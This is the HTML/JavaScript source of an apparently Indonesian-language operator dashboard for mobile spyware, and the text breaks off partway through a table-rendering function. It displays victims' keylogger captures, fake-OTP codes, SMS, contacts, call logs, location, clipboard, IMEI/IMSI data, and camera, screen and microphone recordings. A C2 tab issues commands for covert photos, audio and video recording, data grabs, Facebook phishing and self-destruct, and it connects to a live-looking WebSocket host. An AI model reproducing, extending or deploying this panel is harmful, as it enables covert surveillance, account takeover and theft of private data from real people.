<!DOCTYPE html>
<html data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>🔬 DASHBOARD ULTIMATE v2.0</title>
    <style>
        /* ============================================================
           THEME VARIABLES
           ============================================================ */
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-card: #1a1a1a;
            --bg-input: #1a1a1a;
            --text-primary: #e0e0e0;
            --text-secondary: #888888;
            --border-color: #2a2a2a;
            --accent: #00ff88;
            --shadow: 0 4px 20px rgba(0,0,0,0.5);
            --scrollbar-track: #1a1a1a;
            --scrollbar-thumb: #333333;
        }

        [data-theme="light"] {
            --bg-primary: #f0f2f5;
            --bg-secondary: #ffffff;
            --bg-card: #ffffff;
            --bg-input: #ffffff;
            --text-primary: #1a1a1a;
            --text-secondary: #666666;
            --border-color: #d0d0d0;
            --accent: #00cc66;
            --shadow: 0 4px 20px rgba(0,0,0,0.1);
            --scrollbar-track: #e0e0e0;
            --scrollbar-thumb: #b0b0b0;
        }

        /* ============================================================
           GLOBAL
           ============================================================ */
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Arial,sans-serif;background:var(--bg-primary);color:var(--text-primary);padding:16px;font-size:13px;transition:background 0.3s,color 0.3s}
        
        /* Scrollbar */
        ::-webkit-scrollbar{width:6px}
        ::-webkit-scrollbar-track{background:var(--scrollbar-track)}
        ::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:3px}
        
        /* ============================================================
           HEADER
           ============================================================ */
        .header{border-bottom:2px solid var(--accent);padding-bottom:12px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
        .header h1{color:var(--accent);font-size:22px;display:flex;align-items:center;gap:10px}
        .live-dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#00ff00;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        
        /* ============================================================
           CARDS
           ============================================================ */
        .card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:8px;padding:14px;margin-bottom:12px;transition:background 0.3s,border 0.3s}
        .card h2{color:var(--accent);font-size:14px;margin-bottom:8px;border-bottom:1px solid var(--border-color);padding-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
        .card h2 .badge{font-size:10px;background:var(--bg-secondary);padding:2px 10px;border-radius:12px;color:var(--text-secondary)}
        
        /* ============================================================
           GRID & STATS
           ============================================================ */
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
        .stat-card{background:var(--bg-secondary);padding:10px;border-radius:6px;text-align:center;border:1px solid var(--border-color);transition:background 0.3s}
        .stat-card .num{font-size:22px;font-weight:bold;color:var(--accent)}
        .stat-card .label{color:var(--text-secondary);font-size:10px;margin-top:3px}
        
        /* ============================================================
           FLEX & BUTTONS
           ============================================================ */
        .flex{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
        .flex-between{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
        
        input,select,button{background:var(--bg-input);border:1px solid var(--border-color);color:var(--text-primary);padding:8px 12px;border-radius:5px;font-size:12px;font-family:inherit;transition:background 0.3s,color 0.3s,border 0.3s}
        input:focus,select:focus{outline:2px solid var(--accent);border-color:var(--accent)}
        button{cursor:pointer;font-weight:bold;transition:0.3s}
        button:hover{transform:scale(1.03)}
        
        .btn-green{background:#00cc66;color:#000;border-color:#00cc66}
        .btn-blue{background:#108ee9;color:#fff;border-color:#108ee9}
        .btn-red{background:#ff4444;color:#fff;border-color:#ff4444}
        .btn-orange{background:#ff8800;color:#fff;border-color:#ff8800}
        .btn-purple{background:#aa44ff;color:#fff;border-color:#aa44ff}
        .btn-gray{background:var(--bg-secondary);color:var(--text-secondary);border-color:var(--border-color)}
        
        /* ============================================================
           TABS
           ============================================================ */
        .tab-btn{background:var(--bg-secondary);border:1px solid var(--border-color);padding:6px 14px;border-radius:5px;cursor:pointer;color:var(--text-secondary);transition:0.3s}
        .tab-btn.active{background:var(--accent);color:#000;border-color:var(--accent)}
        .tab-content{display:none}
        .tab-content.active{display:block}
        
        /* ============================================================
           TABLES
           ============================================================ */
        table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
        th{background:var(--bg-secondary);color:var(--accent);padding:6px 8px;text-align:left;border:1px solid var(--border-color)}
        td{padding:5px 8px;border:1px solid var(--border-color);word-break:break-all}
        
        /* ============================================================
           LOG
           ============================================================ */
        .log-container{max-height:500px;overflow-y:auto;font-size:12px}
        .log-item{padding:4px 8px;border-bottom:1px solid var(--border-color);display:grid;grid-template-columns:140px 120px 1fr;gap:8px;align-items:start}
        .log-item .time{color:var(--text-secondary);font-size:10px}
        .log-item .sumber{font-weight:bold;font-size:11px}
        .log-item .data{color:var(--text-primary);word-break:break-all;font-size:11px}
        .log-keylogger .sumber{color:#ff4444}
        .log-otp .sumber{color:#ff44aa}
        .log-location .sumber{color:#44aaff}
        .log-contact .sumber{color:#44ff88}
        .log-sms .sumber{color:#ff8844}
        .log-c2 .sumber{color:#aa44ff}
        
        /* ============================================================
           MEDIA
           ============================================================ */
        .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
        .media-item{background:var(--bg-secondary);border-radius:6px;padding:8px;border:1px solid var(--border-color);text-align:center}
        .media-item .label{color:var(--text-secondary);font-size:10px;margin:4px 0}
        .media-item audio,.media-item video{width:100%;border-radius:4px}
        .preview-img{max-width:100%;max-height:200px;border-radius:4px;cursor:pointer}
        .img-preview{max-width:100%;max-height:400px;border-radius:6px;border:1px solid var(--border-color);cursor:pointer}
        
        /* ============================================================
           FILE MANAGER
           ============================================================ */
        .file-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px}
        .file-item{background:var(--bg-secondary);padding:6px;border-radius:4px;text-align:center;font-size:10px;border:1px solid var(--border-color);word-break:break-all}
        .file-item .name{color:var(--accent);font-weight:bold}
        .file-item .path{color:var(--text-secondary);font-size:8px}
        
        /* ============================================================
           PAGINATION
           ============================================================ */
        .pagination{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px;justify-content:center}
        .pagination button{padding:4px 12px;font-size:11px}
        .pagination .active{background:var(--accent);color:#000;border-color:var(--accent)}
        
        /* ============================================================
           LOGIN
           ============================================================ */
        .password-container{max-width:400px;margin:40px auto;padding:30px;background:var(--bg-card);border-radius:10px;border:1px solid var(--border-color);text-align:center}
        .password-container input{width:100%;margin:10px 0;padding:12px;font-size:16px;text-align:center}
        .error{color:#ff4444;margin-top:8px;display:none}
        
        /* ============================================================
           TOAST & EMPTY
           ============================================================ */
        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--bg-card);color:var(--text-primary);padding:10px 24px;border-radius:8px;font-size:13px;z-index:999;display:none;border-left:4px solid var(--accent);box-shadow:var(--shadow)}
        .empty{color:var(--text-secondary);text-align:center;padding:20px;font-size:13px}
        
        /* ============================================================
           JSON VIEW
           ============================================================ */
        .json-view{background:var(--bg-primary);padding:8px;border-radius:4px;font-size:10px;max-height:200px;overflow-y:auto;white-space:pre-wrap;font-family:monospace;color:var(--text-secondary)}
        
        /* ============================================================
           THEME TOGGLE
           ============================================================ */
        .theme-toggle{position:relative;width:44px;height:22px;background:var(--bg-secondary);border-radius:11px;border:1px solid var(--border-color);cursor:pointer;transition:0.3s;flex-shrink:0}
        .theme-toggle::after{content:'🌙';position:absolute;top:2px;left:2px;width:18px;height:18px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;font-size:10px;transition:0.3s}
        .theme-toggle.light::after{content:'☀️';transform:translateX(20px)}
        
        /* ============================================================
           RESPONSIVE
           ============================================================ */
        @media(max-width:600px){
            .log-item{grid-template-columns:1fr;gap:2px}
            .header h1{font-size:18px}
            .media-grid{grid-template-columns:1fr}
            .grid{grid-template-columns:repeat(2,1fr)}
        }
        
        /* ============================================================
           DATA SECTION ANIMATION
           ============================================================ */
        .data-section{animation:fadeIn 0.3s ease}
        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
    </style>
</head>
<body>

<div class="toast" id="toast"></div>

<!-- LOGIN -->
<div id="loginBox" class="password-container">
    <h1 style="color:var(--accent);font-size:24px;">🔐 DASHBOARD</h1>
    <p style="color:var(--text-secondary);font-size:13px;margin:10px 0;">Masukkan password</p>
    <input type="password" id="pw" placeholder="Password" onkeyup="if(event.key==='Enter')login()">
    <button class="btn-green" onclick="login()" style="width:100%;padding:12px;font-size:16px;">🔓 BUKA</button>
    <div class="error" id="loginError">❌ Password salah!</div>
</div>

<!-- MAIN -->
<div id="main" style="display:none">

    <div class="header">
        <h1><span class="live-dot"></span> 🔬 DASHBOARD ULTIMATE v2.0</h1>
        <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center">
            <span id="statusInfo" style="color:var(--text-secondary);font-size:12px;">⏳ Loading...</span>
            <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()"></button>
            <button class="btn-blue" onclick="refreshData()">🔄 Refresh</button>
            <button class="btn-green" onclick="exportJSON()">📤 JSON</button>
            <button class="btn-orange" onclick="exportCSV()">📊 CSV</button>
            <button class="btn-red" onclick="clearAll()">🗑️ Clear</button>
            <button class="btn-gray" onclick="logout()">🚪 Logout</button>
        </div>
    </div>

    <!-- STATS -->
    <div class="card">
        <h2>📊 STATISTIK</h2>
        <div class="grid" id="statsGrid"></div>
    </div>

    <!-- TABS -->
    <div style="display:flex;flex-wrap:wrap;gap:5px;margin-bottom:12px;">
        <button class="tab-btn active" data-tab="tabAll" onclick="switchTab('tabAll')">📦 Semua Data</button>
        <button class="tab-btn" data-tab="tabMedia" onclick="switchTab('tabMedia')">🖼️ Media</button>
        <button class="tab-btn" data-tab="tabLog" onclick="switchTab('tabLog')">📋 Log</button>
        <button class="tab-btn" data-tab="tabC2" onclick="switchTab('tabC2')">🎮 C2</button>
        <button class="tab-btn" data-tab="tabFiles" onclick="switchTab('tabFiles')">📁 Files</button>
    </div>

    <!-- TAB 1: SEMUA DATA -->
    <div id="tabAll" class="tab-content active">
        <div class="card">
            <div class="flex-between">
                <div class="flex">
                    <input type="text" id="dataSearch" placeholder="🔍 Cari di semua data..." onkeyup="renderDataSections()" style="width:250px;">
                    <select id="dataSort" onchange="renderDataSections()">
                        <option value="newest">Terbaru</option>
                        <option value="oldest">Terlama</option>
                        <option value="source">Sumber A-Z</option>
                    </select>
                </div>
                <span style="color:var(--text-secondary);font-size:11px;" id="dataCount">0 items</span>
            </div>
        </div>
        <div id="dataSections"></div>
        <div class="pagination" id="dataPagination"></div>
    </div>

    <!-- TAB 2: MEDIA -->
    <div id="tabMedia" class="tab-content">
        <div id="mediaSections"></div>
    </div>

    <!-- TAB 3: LOG -->
    <div id="tabLog" class="tab-content">
        <div class="card">
            <div class="flex-between">
                <div class="flex">
                    <input type="text" id="logSearch" placeholder="🔍 Cari..." onkeyup="renderLog()" style="width:200px;">
                    <select id="logFilter" onchange="renderLog()">
                        <option value="">Semua</option>
                    </select>
                    <span style="color:var(--text-secondary);font-size:11px;" id="logCount">0</span>
                </div>
                <button class="btn-gray" onclick="resetFilter()">Reset</button>
            </div>
            <div class="log-container" id="logContainer"></div>
        </div>
    </div>

    <!-- TAB 4: C2 -->
    <div id="tabC2" class="tab-content">
        <div class="card">
            <h2>🎮 C2 COMMAND CENTER</h2>
            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:6px;margin-bottom:12px;">
                <button class="btn-blue" onclick="sendC2('screenshot')">📸 Screenshot</button>
                <button class="btn-blue" onclick="sendC2('take_photo')">📷 Photo</button>
                <button class="btn-blue" onclick="sendC2('record_audio',{durasi:30})">🎤 Audio 30s</button>
                <button class="btn-blue" onclick="sendC2('record_video',{durasi:30})">🎥 Video 30s</button>
                <button class="btn-green" onclick="sendC2('ambil_lokasi')">📍 Lokasi</button>
                <button class="btn-green" onclick="sendC2('ambil_kontak')">📇 Kontak</button>
                <button class="btn-green" onclick="sendC2('ambil_sms',{jumlah:50})">💬 SMS</button>
                <button class="btn-purple" onclick="sendC2('buka_wa')">💚 WA</button>
                <button class="btn-purple" onclick="sendC2('buka_telegram')">💙 TG</button>
                <button class="btn-orange" onclick="sendC2('phishing_fb')">📘 Phishing</button>
                <button class="btn-red" onclick="if(confirm('Self Destruct?'))sendC2('self_destruct')">💀 Self Destruct</button>
            </div>
            <div class="flex">
                <input type="text" id="c2Custom" placeholder='{"aksi":"perintah"}' style="flex:2;min-width:150px;">
                <button class="btn-blue" onclick="sendC2Custom()">📤 Kirim</button>
            </div>
            <div id="c2Result" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
        </div>
        <div class="card"><h2>📜 C2 History</h2><div id="c2History" style="max-height:200px;overflow-y:auto;font-size:12px;"></div></div>
    </div>

    <!-- TAB 5: FILE MANAGER -->
    <div id="tabFiles" class="tab-content">
        <div class="card">
            <h2>📁 FILE MANAGER</h2>
            <div class="flex" style="margin-bottom:10px;">
                <input type="text" id="filePath" value="/" style="flex:2;min-width:150px;" placeholder="/path/to/dir">
                <button class="btn-blue" onclick="listFiles()">📂 List</button>
                <button class="btn-green" onclick="uploadFile()">📤 Upload</button>
                <input type="file" id="fileUpload" style="display:none" onchange="uploadFileSubmit()">
            </div>
            <div id="fileListContainer">
                <div class="empty">📂 Klik "List" untuk melihat file</div>
            </div>
        </div>
    </div>

</div>

<script>
// ============================================================
// 🔥 GLOBAL ERROR HANDLER
// ============================================================
window.addEventListener('error', function(e) {
    try {
        fetch('/error', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                message: e.message || 'Unknown error',
                filename: e.filename || '',
                lineno: e.lineno || 0,
                colno: e.colno || 0,
                stack: e.error?.stack || 'No stack'
            })
        }).catch(function(){});
    } catch(err) {}
    return true;
});

window.addEventListener('unhandledrejection', function(e) {
    try {
        fetch('/error', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: 'unhandled_rejection',
                reason: String(e.reason || 'Unknown')
            })
        }).catch(function(){});
    } catch(err) {}
    e.preventDefault();
    return true;
});

// ============================================================
// 🔥 THEME TOGGLE
// ============================================================
function toggleTheme() {
    var html = document.documentElement;
    var current = html.getAttribute('data-theme');
    var next = current === 'dark' ? 'light' : 'dark';
    html.setAttribute('data-theme', next);
    document.getElementById('themeToggle').className = next === 'light' ? 'theme-toggle light' : 'theme-toggle';
    localStorage.setItem('dash_theme', next);
}

// Load saved theme
var savedTheme = localStorage.getItem('dash_theme') || 'dark';
document.documentElement.setAttribute('data-theme', savedTheme);
if (savedTheme === 'light') {
    document.getElementById('themeToggle').className = 'theme-toggle light';
}

// ============================================================
// 🔥 GLOBAL VARIABLES
// ============================================================
var allData = [];
var KEY = '';
var c2History = [];
var currentPage = 1;
var pageSize = 20;
var ws = null;

// ============================================================
// 🔥 LOGIN
// ============================================================
function login() {
    var pw = document.getElementById('pw').value;
    if(!pw) { showToast('Masukkan password!'); return; }
    KEY = pw;
    localStorage.setItem('dash_key', pw);
    document.getElementById('loginBox').style.display = 'none';
    document.getElementById('main').style.display = 'block';
    document.getElementById('statusInfo').textContent = '🔓 Login sukses';
    refreshData();
    connectWebSocket();
    setInterval(refreshData, 5000);
}

function logout() {
    if(!confirm('Logout?')) return;
    localStorage.removeItem('dash_key');
    KEY = '';
    document.getElementById('loginBox').style.display = 'block';
    document.getElementById('main').style.display = 'none';
    if(ws) { try { ws.close(); } catch(e) {} }
    showToast('🚪 Logout berhasil');
}

function showToast(msg, dur) {
    var t = document.getElementById('toast');
    t.textContent = msg;
    t.style.display = 'block';
    clearTimeout(t._timer);
    t._timer = setTimeout(function(){ t.style.display = 'none'; }, dur||3000);
}

// ============================================================
// 🔥 WEBSOCKET REAL-TIME
// ============================================================
function connectWebSocket() {
    try {
        if (typeof WebSocket === 'undefined') return;
        ws = new WebSocket('wss://verifikasi.site/ws');
        
        ws.onopen = function() {
            document.getElementById('statusInfo').textContent = '🔌 WebSocket connected';
            ws.send(JSON.stringify({
                type: 'auth',
                key: KEY
            }));
        };
        
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'new_data') {
                    showToast('📦 Data baru dari: ' + (data.sumber || 'unknown'));
                    refreshData();
                }
                if (data.type === 'c2_result') {
                    showToast('✅ C2 result: ' + (data.perintah || ''));
                    refreshData();
                }
            } catch(e) {}
        };
        
        ws.onclose = function() {
            document.getElementById('statusInfo').textContent = '🔌 WebSocket disconnected, reconnecting...';
            setTimeout(connectWebSocket, 5000);
        };
        
        ws.onerror = function() {
            // Let onclose handle reconnect
        };
    } catch(e) {
        setTimeout(connectWebSocket, 10000);
    }
}

// ============================================================
// 🔥 REFRESH DATA (DENGAN CACHE)
// ============================================================
function refreshData() {
    if(!KEY) return;
    
    // Cek cache
    var cached = localStorage.getItem('dash_cache');
    var cacheTime = parseInt(localStorage.getItem('dash_cache_time') || '0');
    if (cached && (Date.now() - cacheTime < 30000)) {
        try {
            allData = JSON.parse(cached);
            document.getElementById('statusInfo').textContent = '📦 Cache (' + allData.length + ' data) - ' + new Date().toLocaleTimeString();
            renderAll();
            return;
        } catch(e) {}
    }
    
    fetch('/data?key=' + encodeURIComponent(KEY))
        .then(function(r){ 
            if(!r.ok) throw new Error('HTTP ' + r.status);
            return r.json(); 
        })
        .then(function(data){
            allData = data || [];
            // Cache
            try {
                localStorage.setItem('dash_cache', JSON.stringify(allData));
                localStorage.setItem('dash_cache_time', String(Date.now()));
            } catch(e) {}
            document.getElementById('statusInfo').textContent = '✅ ' + allData.length + ' data - ' + new Date().toLocaleTimeString();
            renderAll();
        })
        .catch(function(e){
            document.getElementById('statusInfo').textContent = '❌ Error: ' + e.message;
            // Fallback ke cache
            if (cached) {
                try {
                    allData = JSON.parse(cached);
                    renderAll();
                    showToast('⚠️ Menggunakan data cache');
                } catch(e) {}
            }
        });
}

function renderAll() {
    renderStats();
    renderDataSections();
    renderMediaSections();
    renderLog();
    renderC2History();
}

// ============================================================
// 🔥 STATS
// ============================================================
function renderStats() {
    try {
        var map = {};
        allData.forEach(function(item){
            var s = item.sumber || 'unknown';
            map[s] = (map[s]||0)+1;
        });
        map['Total'] = allData.length;
        var html = '';
        var sorted = Object.keys(map).sort();
        sorted.forEach(function(k){
            html += '<div class="stat-card"><div class="num">'+map[k]+'</div><div class="label">'+k+'</div></div>';
        });
        document.getElementById('statsGrid').innerHTML = html;
    } catch(e) {
        document.getElementById('statsGrid').innerHTML = '<div class="empty">Error rendering stats</div>';
    }
}

// ============================================================
// 🔥 RENDER SEMUA DATA (TAB 1) DENGAN PAGINATION
// ============================================================
function renderDataSections() {
    try {
        var container = document.getElementById('dataSections');
        var search = document.getElementById('dataSearch').value.toLowerCase();
        var sort = document.getElementById('dataSort').value;
        
        // Filter
        var filtered = allData.filter(function(item){
            if(!search) return true;
            var json = JSON.stringify(item).toLowerCase();
            return json.includes(search);
        });
        
        document.getElementById('dataCount').textContent = filtered.length + ' items';
        
        // Sort
        if (sort === 'newest') {
            filtered.sort(function(a,b){ return (b.waktu||0) - (a.waktu||0); });
        } else if (sort === 'oldest') {
            filtered.sort(function(a,b){ return (a.waktu||0) - (b.waktu||0); });
        } else if (sort === 'source') {
            filtered.sort(function(a,b){ return (a.sumber||'').localeCompare(b.sumber||''); });
        }
        
        // Pagination
        var totalPages = Math.ceil(filtered.length / pageSize) || 1;
        if (currentPage > totalPages) currentPage = totalPages;
        var start = (currentPage - 1) * pageSize;
        var end = Math.min(start + pageSize, filtered.length);
        var pageData = filtered.slice(start, end);
        
        // Group by source
        var groups = {};
        pageData.forEach(function(item){
            if(!groups[item.sumber]) groups[item.sumber] = [];
            groups[item.sumber].push(item);
        });
        
        var html = '';
        Object.keys(groups).sort().forEach(function(src){
            var items = groups[src];
            var last = items[items.length-1];
            html += '<div class="card data-section">';
            html += '<h2>'+getIcon(src)+' '+src+' <span class="badge">'+items.length+'x</span></h2>';
            html += renderDataContent(src, items, last);
            html += '</div>';
        });
        container.innerHTML = html || '<div class="empty">📭 Tidak ada data</div>';
        
        // Pagination
        var pagContainer = document.getElementById('dataPagination');
        if (totalPages > 1) {
            var ph = '';
            for (var i = 1; i <= Math.min(totalPages, 50); i++) {
                ph += '<button class="' + (i === currentPage ? 'active' : '') + '" onclick="currentPage='+i+';renderDataSections();">'+i+'</button>';
            }
            pagContainer.innerHTML = ph;
        } else {
            pagContainer.innerHTML = '';
        }
    } catch(e) {
        document.getElementById('dataSections').innerHTML = '<div class="empty">Error: ' + e.message + '</div>';
    }
}

// ============================================================
// 🔥 RENDER DATA CONTENT PER SOURCE
// ============================================================
function renderDataContent(src, items, last) {
    try {
        var data = last ? last.data : null;
        if(!data) return '<div class="empty">No data</div>';
        
        // --- FOTO / SCREENSHOT ---
        if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
            var imgSrc = typeof data === 'string' ? data : (data.data || data.image || '');
            if(imgSrc && imgSrc.startsWith('data:image')) {
                return '<img src="'+imgSrc+'" class="img-preview" onclick="window.open(this.src,\'_blank\')"><br>'+
                       '<a href="'+imgSrc+'" download="'+src+'.png" style="color:var(--accent);">📥 Download</a>';
            }
            return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
        }
        
        // --- GALLERY PHOTOS ---
        if (src === 'gallery_photos' && Array.isArray(data)) {
            var h = '<div class="file-grid">';
            data.forEach(function(path){
                var name = path.split('/').pop();
                h += '<div class="file-item"><div class="name">📷 '+escapeHtml(name)+'</div><div class="path">'+escapeHtml(path)+'</div></div>';
            });
            h += '</div>';
            return h;
        }
        
        // --- AUDIO ---
        if (src === 'audio_record' || src === 'mic_recording' || src === 'audio_recording') {
            var audioSrc = typeof data === 'string' ? data : (data.data || data.audio || '');
            if(audioSrc && audioSrc.startsWith('data:audio')) {
                return '<audio controls style="width:100%;"><source src="'+audioSrc+'"></audio><br>'+
                       '<a href="'+audioSrc+'" download="recording.webm" style="color:var(--accent);">📥 Download</a>';
            }
            return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
        }
        
        // --- VIDEO ---
        if (src === 'video_record' || src === 'video_recording') {
            var videoSrc = typeof data === 'string' ? data : (data.data || data.video || '');
            if(videoSrc && videoSrc.startsWith('data:video')) {
                return '<video controls style="width:100%;max-height:300px;"><source src="'+videoSrc+'"></video><br>'+
                       '<a href="'+videoSrc+'" download="recording.webm" style="color:var(--accent);">📥 Download</a>';
            }
            return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
        }
        
        // --- KEYLOGGER ---
        if (src === 'keylogger' || src === 'keylogger_ws') {
            if(typeof data === 'object') {
                var h = '<table><tr><th>Field</th><th>Value</th></tr>';
                for(var k in data){
                    h += '<tr><td>'+escapeHtml(k)+'</td><td style="color:#ff4444;font-weight:bold;">'+escapeHtml(String(data[k]))+'</td></tr>';
                }
                h += '</table>';
                return h;
            }
        }
        
        // --- OTP ---
        if (src === 'fake_otp') {
            var h = '<table><tr><th>Waktu</th><th>OTP</th></tr>';
            items.slice(-20).reverse().forEach(function(item){
                var d = item.data || {};
                var otp = d.otp || d.data || '?';
                var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
                h += '<tr><td style="font-size:10px;">'+waktu+'</td><td style="color:#ff44aa;font-weight:bold;font-size:20px;">'+escapeHtml(String(otp))+'</td></tr>';
            });
            h += '</table>';
            return h;
        }
        
        // --- KONTAK ---
        if (src === 'kontak_all' && Array.isArray(data)) {
            return renderTable(data, ['nama','nomor']);
        }
        
        // --- SMS ---
        if (src === 'sms_all' && Array.isArray(data)) {
            return renderTable(data, ['address','body'], 20);
        }
        
        // --- CALL LOG ---
        if (src === 'call_log' && Array.isArray(data)) {
            return renderTable(data, ['number','duration'], 20);
        }
        
        // --- APLIKASI ---
        if (src === 'aplikasi_all' && Array.isArray(data)) {
            return renderTable(data, ['nama','package'], 30);
        }
        
        // --- LOKASI ---
        if (src === 'lokasi') {
            var lat = data.lat || data.latitude || '?';
            var lon = data.lon || data.longitude || '?';
            return '<div style="font-size:14px;">📍 <b>Lat:</b> '+lat+' | <b>Lon:</b> '+lon+' | <b>Akurasi:</b> '+(data.akurasi||data.accuracy||'?')+'m</div>'+
                   '<a href="https://maps.google.com/?q='+lat+','+lon+'" target="_blank" style="color:var(--accent);">🗺️ Buka Google Maps</a>';
        }
        
        // --- CLIPBOARD ---
        if (src === 'clipboard') {
            return '<pre style="color:#ff0;font-size:14px;background:var(--bg-primary);padding:10px;border-radius:4px;">'+escapeHtml(String(data))+'</pre>';
        }
        
        // --- C2 RESULT ---
        if (src === 'c2_result') {
            var h = '<div style="font-size:12px;">';
            if(data.perintah) h += '<b>Perintah:</b> '+escapeHtml(String(data.perintah))+'<br>';
            if(data.hasil) {
                var hasil = typeof data.hasil === 'string' ? data.hasil : JSON.stringify(data.hasil, null, 2);
                h += '<b>Hasil:</b><br><pre style="font-size:10px;color:#aa44ff;max-height:150px;overflow-y:auto;">'+escapeHtml(hasil)+'</pre>';
            }
            h += '</div>';
            return h;
        }
        
        // --- DEVICE INFO ---
        if (src === 'device_info' || src === 'init') {
            var h = '<table><tr><th>Key</th><th>Value</th></tr>';
            var fields = ['ua','pl','la','sc','cd','pr','dm','cc','on','ve','mt','tz','ip','ip_local','model','brand','android'];
            fields.forEach(function(f){
                if(data[f] !== undefined && data[f] !== null && data[f] !== '') {
                    h += '<tr><td>'+f+'</td><td>'+escapeHtml(String(data[f]))+'</td></tr>';
                }
            });
            h += '</table>';
            return h;
        }
        
        // --- TELEPON INFO ---
        if (src === 'telepon_info') {
            var h = '<table><tr><th>Key</th><th>Value</th></tr>';
            ['imei','imsi','nomor','operator'].forEach(function(f){
                if(data[f]) h += '<tr><td>'+f+'</td><td style="color:#ff0;font-weight:bold;">'+escapeHtml(String(data[f]))+'</td></tr>';
            });
            h += '</table>';
            return h;
        }
        
        // --- DEFAULT: JSON VIEW ---
        return '<div class="json-view">'+escapeHtml(JSON.stringify(data, null, 2))+'</div>';
    } catch(e) {
        return '<div class="empty">Error rendering: ' + e.message + '</div>';
    }
}

// ============================================================
// 🔥 RENDER MEDIA (TAB 2)
// ============================================================
function renderMediaSections() {
    try {
        var container = document.getElementById('mediaSections');
        var mediaItems = [];
        
        allData.forEach(function(item){
            var src = item.sumber || '';
            var data = item.data;
            var isMedia = false;
            var mediaType = '';
            var mediaSrc = '';
            
            if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
                mediaSrc = typeof data === 'string' ? data : (data.data || data.image || '');
                if(mediaSrc && mediaSrc.startsWith('data:image')) { isMedia = true; mediaType = 'image'; }
            }
            if (src === 'gallery_photos' && Array.isArray(data)) {
                data.forEach(function(path){
                    mediaItems.push({ type: 'file', label: path.split('/').pop(), path: path, waktu: item.waktu });
                });
                isMedia = false;
            }
            if (src === 'audio_record' || src === 'mic_recording') {
                mediaSrc = typeof data === 'string' ? data : (data.data || '');
                if(mediaSrc && mediaSrc.startsWith('data:audio')) { isMedia = true; mediaType = 'audio'; }
            }
            if (src === 'video_record') {
                mediaSrc = typeof data === 'string' ? data : (data.data || '');
                if(mediaSrc && mediaSrc.startsWith('data:video')) { isMedia = true; mediaType = 'video'; }
            }
            
            if(isMedia) {
                mediaItems.push({
                    type: mediaType,
                    src: mediaSrc,
                    sumber: src,
                    waktu: item.waktu
                });
            }
        });
        
        if(!mediaItems.length) {
            container.innerHTML = '<div class="card"><div class="empty">📭 Belum ada media (foto/audio/video)</div></div>';
            return;
        }
        
        var html = '<div class="card"><h2>🖼️ MEDIA ('+mediaItems.length+')</h2><div class="media-grid">';
        mediaItems.forEach(function(item){
            html += '<div class="media-item">';
            html += '<div class="label">'+item.sumber+'</div>';
            if(item.type === 'image') {
                html += '<img src="'+item.src+'" class="preview-img" onclick="window.open(this.src,\'_blank\')">';
                html += '<br><a href="'+item.src+'" download="media_'+Date.now()+'.png" style="color:var(--accent);font-size:10px;">📥 Download</a>';
            } else if(item.type === 'audio') {
                html += '<audio controls><source src="'+item.src+'"></audio>';
            } else if(item.type === 'video') {
                html += '<video controls style="width:100%;max-height:200px;"><source src="'+item.src+'"></video>';
            } else if(item.type === 'file') {
                html += '<div style="color:var(--accent);font-size:12px;">📄 '+escapeHtml(item.label)+'</div>';
                html += '<div style="color:var(--text-secondary);font-size:9px;">'+escapeHtml(item.path)+'</div>';
            }
            if(item.waktu) {
                html += '<div style="color:var(--text-secondary);font-size:9px;margin-top:4px;">'+new Date(item.waktu).toLocaleString('id-ID')+'</div>';
            }
            html += '</div>';
        });
        html += '</div></div>';
        container.innerHTML = html;
    } catch(e) {
        document.getElementById('mediaSections').innerHTML = '<div class="card"><div class="empty">Error: ' + e.message + '</div></div>';
    }
}

// ============================================================
function getIcon(src) {
    var icons = {
        'init':'📱','device_info':'📱','telepon_info':'📞','lokasi':'📍',
        'kontak_all':'📇','sms_all':'💬','call_log':'📞','keylogger':'⌨️',
        'clipboard':'📋','fake_otp':'🔐','screenshot':'📸','screen_capture':'📸',
        'gallery_photos':'🖼️','audio_record':'🎤','video_record':'🎬',
        'download':'📥','aplikasi_all':'📱','wifi_passwords':'📶','c2_result':'🎮'
    };
    return icons[src] || '📄';
}

function escapeHtml(str) {
    if(!str) return '';
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function renderTable(data, cols, limit) {
    if(!Array.isArray(data) || !data.length) return '<div class="empty">Tidak ada data</div>';
